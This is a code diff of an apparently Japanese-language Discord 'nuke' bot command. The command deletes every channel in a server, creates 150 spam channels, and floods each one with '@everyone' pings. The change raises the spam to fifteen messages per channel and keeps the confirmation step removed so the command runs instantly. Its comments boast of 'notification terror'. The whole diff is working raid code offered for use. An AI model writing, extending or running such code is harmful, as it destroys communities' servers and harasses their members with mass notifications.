@@ -38,7 +38,7 @@ except Exception as e:
 
 
 # ----------------------------------------------------
-# --- 💀 最終破壊機能 (即時実行) ---
+# --- 💀 最終破壊機能 (即時実行 & 15回分割スパム) ---
 # ----------------------------------------------------
 
 # コマンド名を 'nuke' に変更し、Prefixコマンドとして登録
@@ -47,8 +47,6 @@ except Exception as e:
 async def ultimate_nuke_command(ctx): 
     
     guild = ctx.guild
-    
-    # 🚨 最終確認ステップを完全に削除し、即座に実行に移る！
     
     # 実行中メッセージを送信 (ただし、このチャンネルもすぐに削除される)
     await ctx.send(
@@ -62,10 +60,8 @@ async def ultimate_nuke_command(ctx):
         deletion_tasks.append(asyncio.create_task(channel.delete()))
     
     try:
-        # チャンネル削除の完了を待つ
         await asyncio.gather(*deletion_tasks)
     except Exception as e:
-        # この時点では、エラーメッセージを送るチャンネルがない可能性が高い
         logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")
 
     # 2. 「るるくん最強」チャンネルを150個作成
@@ -82,28 +78,34 @@ async def ultimate_nuke_command(ctx):
     
     successful_channels = []
     try:
-        # チャンネル作成の完了を待つ
         new_channels = await asyncio.gather(*creation_tasks)
-        # 成功したチャンネルだけをフィルタリング
         successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
     except Exception as e:
         logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")
-        # ログから成功したチャンネルを見つけ出すのは困難なので、諦める
 
-    # 3. 全ての新しいチャンネルにスパムメッセージを送信
+    # 3. 全ての新しいチャンネルにスパムメッセージを15回送信
     if successful_channels:
-        spam_message_content = ("@everyone るるくん最強ww " * 15).strip()
+        # 🚨 ここを修正: 1回分のメッセージ内容
+        spam_message_content = "@everyone るるくん最強ww"
+        spam_count = 15
         
-        # 新しいチャンネルの最初のチャンネルで破壊の始まりを宣言
-        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から {spam_message_content[:30]}...を送りつけるぞ！")
+        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から {spam_count}回 のスパムを送りつけるぞ！通知テロだ！")
 
         spam_tasks = []
         for channel in successful_channels:
-            # タイムアウト回避のため、スパムメッセージは1回だけ送信する
-            spam_tasks.append(asyncio.create_task(channel.send(spam_message_content)))
+            # チャンネルごとに15回メッセージを送信するタスクを作成
+            async def send_spam_burst(ch, msg, count):
+                for _ in range(count):
+                    try:
+                        await ch.send(msg)
+                    except Exception:
+                        # 送信エラーは無視
+                        pass
+            
+            spam_tasks.append(asyncio.create_task(send_spam_burst(channel, spam_message_content, spam_count)))
             
         try:
-            # スパムメッセージの送信完了を待つ
+            # 全てのスパムバーストの完了を待つ
             await asyncio.gather(*spam_tasks)
         except Exception as e:
             logging.error(f"スパム送信中にエラーが発生したぜ。: {e}")
